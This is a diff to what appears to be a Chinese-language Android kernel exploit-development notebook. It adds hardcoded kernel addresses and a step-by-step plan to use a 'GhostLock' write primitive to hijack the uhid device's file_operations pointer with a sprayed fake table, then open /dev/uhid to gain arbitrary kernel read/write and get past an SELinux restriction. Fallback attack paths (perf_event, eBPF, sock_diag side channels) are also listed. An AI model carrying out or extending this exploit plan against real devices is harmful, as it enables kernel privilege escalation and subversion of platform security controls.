@@ -143,7 +143,12 @@ init_task         = 0xffffff80020de280
 init_cred         = 0xffffff80020f0548
 selinux_state     = 0xffffff8002315f68
 ashmem_misc_fops  = 0xffffff800223b5e8
+uhid_fops         = 0xffffffc0812bb120   (const struct file_operations)
+uhid_misc         = 0xffffffc082234fc0   (struct miscdevice)
+uhid_misc.fops    = 0xffffffc082234fd0   (= uhid_misc + 0x10, 当前指向 uhid_fops)
 ```
+**uhid fops 劫持目标 (绕过 ashmem SELinux 墙)**: `write_left = uhid_misc.fops - 8 = 0xffffffc082234fc8`
+→ GhostLock 写 `*(0xffffffc082234fd0) = &fake_w0.pi_tree_entry` (spray 页面) → open("/dev/uhid") 触发劫持。
 
 ### task_struct 偏移
 ```
@@ -197,7 +202,12 @@ rt_mutex_cleanup_proxy_lock = 0xffffffc081052634
 
 ### 优先级 2: 解决 mm->owner 读取 (★ 当前最高优先级, 双方共同缺口)
 真实 blocker 是 ashmem SELinux 墙, 不是 configfs 代码 bug。候选突破 (按优先级):
-1. **uhid fops 重定向 bootstrap** (最有价值假设): GhostLock 写 `uhid_fops` → spray fake fops → open("/dev/uhid") (shell 可 open) → 任意 RW gadget → 读 mm->owner 拿 task_struct。需先提取 `uhid_fops` 地址 + 找 uhid 的 RW gadget。
+1. **uhid fops 重定向 bootstrap** (最有价值假设, 目标地址已提取):
+   - 目标: `write_left = uhid_misc.fops - 8 = 0xffffffc082234fc8` (KASLR=0)
+   - GhostLock 写 `*(0xffffffc082234fd0) = &fake_w0.pi_tree_entry` (spray 页面)
+   - 然后 `open("/dev/uhid")` (shell 域可 open, 已验证 fd=3) → 该 fd 的 `file->f_op` 指向 spray fake fops
+   - 在 spray 页面伪造 fake fops 表, 把 `.read`/`.unlocked_ioctl` 指向一个能做任意 RW 的内核 gadget (参数 buf/arg 用户态可控)
+   - 需反汇编 vmlinux 枚举 gadget (团队 configfs name-blob 机制 uhid 没有, 不能直接复用)
 2. 枚举 shell 域可 open 的全部设备, 找比 uhid 更优的 fops 劫持目标 (带可控参数 syscall 的)。
 3. 重新审视 /dev/ashmem 是否可在其他域/路径 open。
 4. 次选: perf_event (被 SELinux 拒)、eBPF (通常不可)、sock_diag 侧信道。
